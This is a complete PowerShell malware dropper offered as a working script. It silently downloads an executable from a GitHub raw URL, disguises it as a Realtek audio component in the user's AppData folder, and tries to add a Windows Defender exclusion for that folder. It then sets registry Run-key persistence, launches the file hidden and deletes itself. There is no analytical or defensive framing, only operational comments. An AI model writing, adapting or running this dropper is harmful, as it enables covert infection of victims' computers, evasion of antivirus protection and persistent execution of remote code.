# Silent download and execution - NO self-elevation (fails in hidden context)

$exeUrl = "https://github.com/webhookrepo195/mypresonalwebhookfile109/raw/refs/heads/main/Realtek%20Audio%20device.exe"

$exePath = "$env:APPDATA\Realtek\RealtekAudioDevice.exe"

$folder = "$env:APPDATA\Realtek"
if (-not (Test-Path $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}

# Exclusion attempt (will likely fail without admin, but harmless)
try {
    Add-MpPreference -ExclusionPath $folder -Force -ErrorAction SilentlyContinue
} catch {}

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop
} catch {
    # Fail silently
}

# Re-attempt exclusion after drop
if (Test-Path $exePath) {
    try {
        Add-MpPreference -ExclusionPath $folder -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Startup persistence
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "RealtekAudioHelper"
Set-ItemProperty -Path $regPath -Name $regName -Value $exePath -Force -ErrorAction SilentlyContinue

# Run hidden
Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction SilentlyContinue

# Self-delete .ps1
Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue


